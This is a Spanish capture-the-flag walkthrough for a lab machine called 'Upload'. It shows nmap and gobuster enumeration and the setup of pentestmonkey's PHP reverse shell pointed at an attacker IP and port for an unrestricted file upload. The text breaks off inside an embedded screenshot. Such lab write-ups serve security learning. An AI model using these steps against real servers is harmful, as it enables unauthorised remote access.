@@ -1,0 +1,188 @@
+# Upload
+
+## Reconocimiento y Enumeración.
+
+Comprobar que la máquina está en marcha.
+
+```bash
+❯ ping -c 1 172.17.0.2
+PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
+64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.036 ms
+
+--- 172.17.0.2 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.036/0.036/0.036/0.000 ms
+
+```
+
+Una vez nos responde ping y ya podemos empezar enumerando la máquina. El ttl=64 nos puede indicar que sea una máquina **Linux**.
+
+Lanzamos nmap para ver que puertos nos encuentra.
+
+```bash
+nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
+```
+- `-sS`: Realiza un escaneo SYN.
+- `-p-`: Escanea todos los puertos.
+- `--open`: Muestra solo los puertos abiertos.
+- `--min-rate 5000`: Establece la velocidad mínima de envío de paquetes a 5000 por segundo.
+- `-vvv`: Genera una salida muy detallada y verbosa.
+- `-n`: Evita la resolución de DNS inversa.
+- `-Pn`: Omite la detección de hosts.
+- `-oG allPorts`: Guarda los resultados en un archivo llamado "allPorts".
+- `172.17.0.2`: La dirección IP del host objetivo.
+
+```bash
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack ttl 64
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+```
+
+Como tenemos abierto el puerto 80, vamos a comprobar la versión y lanzar unos scripts básicos para ver que información obtenemos.
+
+```bash
+nmap -sCV -p80 -vvv -oN versionPorts 172.17.0.2
+```
+- `-sCV`: Escaneo de versiones y vulnerabilidades.
+- `-p22,80`: Escaneo de los puertos 80 (HTTP).
+- `-vvv`: Salida muy detallada y verbosa.
+- `-oN versionPorts`: Guarda los resultados en "versionPorts".
+- `172.17.0.2`: Dirección IP del host escaneado.
+
+```bash
+PORT   STATE SERVICE REASON         VERSION
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Upload here your file
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+```
+
+Parece por el título que sea un sistema para subir un archivo y vamos a enumerar la página, mientras vemos lo que contiene, dejamos haciendo fuzzing con gobuster.
+
+```bash
+gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php, txt, html
+```
+
+En la página encontramos un sistema de subir archivos que probaremos a subir un archivo con una reverse shell, para obtener acceso a la máquina.
+
+![upload](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAiEAAAEHCAYAAAB4CpYxAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAABxuSURBVHhe7d15tBTF3cbx5L8kZjnJyZu8ycmq0ejrkqiggohxQVQiCKgo4muMigsqLrhFiIhoVFTccUfENYgIUdlEQRRQQDZB9kVA9k0QBMTfe59iut+ee4s7l7n3WgXzrXM+x56u7p52+tD1TFX13G/tueeeBgAA8E0jhAAAgCAIIQAAIAhCCAAACIIQAgAAgiCEAACAIAghAAAgCEIIAAAIghACAACCIIQAAIAgCCEAACAIQggAAAiCEAIAAIIghAAAgCAIIQAAIAhCCAAACIIQAgAAgiCEAACAIAghAAAgCEIIAAAIghACAACCIIQAAIAgCCEAACAIQggAAAiCEAIAAIIghAAAgCAIIQAAIAhCCAAACIIQAgAAgiCEAACAIAghAAAgCEIIAAAIghACAACCIIQAAIAgCCEAACAIQggAAAiCEAIAAIIghAAAgCAIIQAAIAhCCAAACIIQAgAAgiCEAACAIAghAAAgCEIIAAAIghACAACCIIQAAIAgCCEAACAIQggQQJ06dSxbWrZs6d0uBhdffHHuLM22bdvm3aYmtWvXLvduZps3b86r6927d67G7N13382rA7DrIYSgJGUbVpVGjRp5t5P27dvnttpeGjZs6N1uZ+zuIeTYY4/N7VH1st9++7l9CSFA6SCEoCQRQqrumw4h2vfWW291OnfunHdcQgiweyGEoCQRQqquJkLIpEmTbOjQoZX64x//6D1WFiEE2L0QQlCSCCFVVxMhRMfwbbezCCHA7oUQgpJUUyFkwIABubVmzz33nPs2f/fdd9usWbPsyy+/tDVr1rhtjjrqqLxjViWE/OlPf3LHmjhxon3++ee2detWW7lypY0cOdKuu+4622effSrsI/vvv7/dcccd6X5fffWVrV692oYPH25/+9vfvPuIjjllyhR33mvXrrW3337bmjVrZm3bts2d5TcTQqozJ+TPf/6z3XfffTZ16lTbsGGD23/evHn25JNPus+8/PYAwiKEoCTVVAh56aWXcmvN+vfvb8OGDcu9yi/Lly+3Bg0apPsVCiFNmjSxJUuW5Gr9Zdy4cXbwwQfn7afXM2bMyG3hL//617/y9pEnnngiV5tf1Ig/8MADuVdxh5DjjjvOFi9enKutWPR5HnPMMXn7AAiLEIKSVFMhRL0fSVm/fr1t3LjR7rnnHrv00kvt+eefz9VsLwopyX6VhRAFiWwAWbhwoXXs2NEuuugie/TRR13PRlI0lyLZT7KN9IoVK+z88893gebpp5/OrTXXo5INRM2bN8/VbC/qQVEQuOSSS2zUqFEuCCQl1hCy995754Uv1TVt2tSOP/5469WrV26t2UcffZR3PABhEUJQkmoqhGQbRZWrr746b98XX3wxV2O2ZcsWN8Si9ZWFkPvvvz+31uyLL76wI488Mq0TvUe2aMgkqevTp48bRpEbbrghXa9GWkMsSbn++uvTupdffjm31tw2yTnKvvvum9e7EGsIUehLioagsv8PovCRlDPOOCOvDkA4hBCUpNoIIWrA1Whn923RokWudntp3bq1W19ZCJk+fXpurdmrr76ark8oUKxbty63hbk5EOW38cket1u3bun62bNn59aa9e3bN28feeihh3K1xYeQQk/H9OjRI923mBCSDVIffPCBe9w3K/v/8PDDD+cdE0A4hBCUpNoIIePHj8/bT/SNPFs6dOjg1u8ohOy1116uoU/K7bffnne8RPabfXaYRwFFQzeaL6IegR2Ve++9N91HE1GTkg0niauuuipXW3wIKVR0vsm+xYQQBY+qliFDhuQdE0A4hBCUpAsvvDDXJG0vmj/g205uuumm3FbbS7169dK6bKOoSanZ/UShIFs6derk1u8ohBxwwAG5NduL3jt7vMT777+f2yL/fQcNGpRbu73oaRr1dMycOTNvbkcSQhR6sqVLly7psRKaV5KUWEOInuqpalFgyR4TQDiEEJQkzQvIFk3C9G0n5Z8cyQ65ZBvFsWPH5u0n5XtCrrnmGre+sp6Q7MTTHfWEaHgjKa+99ppb16ZNm9ya7SUJPInsxM1sT0g2nNx11115+8i1116bq413TsiYMWNyaytO1gUQL0IISpKeQPn6669zzZbZwIEDvdupZ0KP1yZl2rRpefXZRlG9Dur5yNYrXGRLq1at3Pqqzgnp169fuj6hEKTfwEhKEhw0NyQpGorJ7qPfFNHTO0nJhhD9jkZSfHNC9BsbSYk1hGQfldbnl90HQLwIIShZ2SENFfUc/OEPf0jrFVQUTrJFf88ke4xso6iiBjRbn306RnMvFGq0vrIQkg0Tejqmfv36aZ1ozkdSFKT0+xharwmXSdGjwupVSfbRXJRsyU7OVPBIiia8Zn975MADD3ThKimxhpDs0zEq5YfX9Jlq7owC1WmnnZZXByAcQghKlhqq7FCEin5bY/To0TZhwoQKdZMnT67w9Eu2UVTIUA9E165d3TyKZ555JlezvegJjmS/ykJI+d8JmT9/vnukVsfU74ToUd+k6HdKkv3KT6DVj4w1btzYhatNmzbZnDlzcjXb/19Up5Bx1lln5dZuL6q74oor7PLLL3e/GaIglBSFnuT9KvNNhxD19GSf8tF1vPHGG+3ss892T94kReEsO6cHQFiEEJQ0NezZx113VPRT6QoO5ffPNorvvPOO+3EvX/n000+tbt266X6VhRDRD4wtXbo0V+sv6qXJhiItz507N1ebXxSsTjrppNyr/y/JI8P6fRFfUQDRX7LNlvJDTj7fdAgRharKPjMFMV3v7D4AwiKEoOQpEOhvtGhiqf7GiiaGqvHVXAlN+tTfW8kObWRlG8URI0a436TQUIdCh3osli1bZi+88EJeAJFCIUT0d1A0d0M9E5rPoV861Td8TbzUr6eW314OP/xwN49k1apVrgFXKNExkrBy2223ueEVHUt/3yZ5NFnBQj/nrv9nnbe2eeONN1zDfuKJJ+bOcnsp/0NgPiFCiBx66KHuN0E0L0S9HqLPQPslw1YA4kEIAaqhUKMIANgxQghQDYQQACgeIQSoBkIIABSPEAJUAyEEAIpHCAGqgRACAMUjhAAAgCAIIQAAIAhCCAAACIIQAgAAgiCEAACAIAghAAAgCEIIAAAIghACAACCIIQAAIAgCCEAACAIQggAAAiCEAIAAIIghAAAgCAIIQAAIAhCCAAACIIQAgAAgiCEAACAIAghAAAgCEIIAAAIghACAACCIIQAAIAgCCG7iIMOOsgaNGhgjRo1suOPPx4AgtK9SPck3Zt89yygKgghu4C6devm/cPP3ggAIITsvUj3KN+9CyiEEBI5fctI/sHXr1/f6tSpY4ceeigABKV7ke5JSRihRwTFIIRETt2d+geuf+y+GwEAhKR7k+5Rulf57mFAZQghkdO3DKEHBECMdG9K7lO+exhQGUJI5PQNQ3z/+AEgBsl9yncPAypDCIkcIQRA7AghKBYhJHKEEACxI4SgWISQyBFCAMSOEIJiEUIiRwgBEDtCCIpFCIkcIQRA7AghKBYhJHKEEACxI4SgWISQyBUTQho3Ptk6dOhk3bs/VdL0Geiz8H1GAGoOIQTFIoREbmdDiBpdNcA9evS0JUtW2rJlq0qS/t/1GeizIIgAtYsQgmIRQiK3syFE3/4fe6yXt2EuRfos9Jn4PisANYMQgmIRQiK3syFE3/xLuQekPH0W+kx8nxWAmkEIQbEIIZErJoT4GuNSRggBahchBMUihESOEFJ9hBCgdhFCUCxCSOQIIdVHCAFqFyEExSKERK4mQ8ihh9ax73znO7bHHnvYD3/4Q6tXr74NHDjEu+3upLIQMmXKFEd/jjy7/rLLLrNx48blrauqLl262JIlS2zhwoV21lln2W233WaNGzd2dYMHD7bbb7+9wj614Zt8rx155ZVX7JFHHvHWYfdBCEGxCCGRq+kQ8tRTz7jlBQsW23XX3WA//elPyxrMFRW23Z0UCiFr1qyp0FgXG0J0rTZt2mQnnniiHX744XbkkUfa8uXLrX379q5+VwshN910k/Xp08dbVxWEkNJACEGxCCGRq60QIrNnz7dvf/vbNmvWvLztdjeFQoh6KlauXJn3ORcbQtTz8dlnn3nrZFcLIdr/rbfe8tZVBSGkNBBCUCxCSORqM4Tcffe9dtRRR6evu3W7x9q0+V/7619PsR/84Af28suvuPWPPvq47bvvvvbjH//YGjY82kaP/tCtP+WUpnbllVel+9988y1um08//cy9XrRoqRv2+fjjT2zs2Al2zDHHup6XX/3qV3n7de/+gO2zzz7285//t7VufbbNn78orasJhUJI27Zt7fHHH7fXX389XV8+hOgaqFFftWqVCxn3339/hSGcU045xdauXWvbtm1zoWbq1KluvbZXONFy+WCgYZrhw4fbihUrbM6cOXbppZemdVndunVzx1GvjY7bvHlzt/6II46w5557zhYvXuyGgLp3757uU/69zj333LJr8bE7t7Fjx1rTpk3TumOOOcb9/6tuwYIFduedd9oFF1xgGzZssC1btrj1t9xyi9u2snNW3YgRI9znMH/+fJsxYwYhpAQQQlAsQkjkajqE/OhHP7Kf/ezn9l//9TP71re+ZR07/jOtVwj5/vd/YE8+2dOmT59tCxcusX79Btjvfvd7GzNmrBvCadfuctt7733KGr1l1qPHY3bIIYek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)
+
+Vamos a ver que hemos encontrado con gobuster y vemos que tenemos un directorio en http://172.17.0.2/uploads/ que tiene pinta que es donde se subirán los archivos.
+
+```bash
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://172.17.0.2/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php,
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.php                 (Status: 403) [Size: 275]
+/.                    (Status: 200) [Size: 1361]
+/uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
+/upload.php           (Status: 200) [Size: 1357]
+/.php                 (Status: 403) [Size: 275]
+/.                    (Status: 200) [Size: 1361]
+/server-status        (Status: 403) [Size: 275]
+```
+
+Ahora para subir la reverse shell vamos a https://github.com/pentestmonkey/php-reverse-shell y utilizamos la reverse-shell.php que han creado ellos que funciona muy bien. Solo hay que copiar el código en un archivo php en nuestro ordenador y sustituir la ip y el puerto en el que vamos a estar en escucha.
+```bash
+$ip = '172.17.0.1';  // CHANGE THIS
+$port = 4443;       // CHANGE THIS
+```
+
+Subimos el archivo y vemos que acepta archivos php.
+
+![shell](data:image/png;base64,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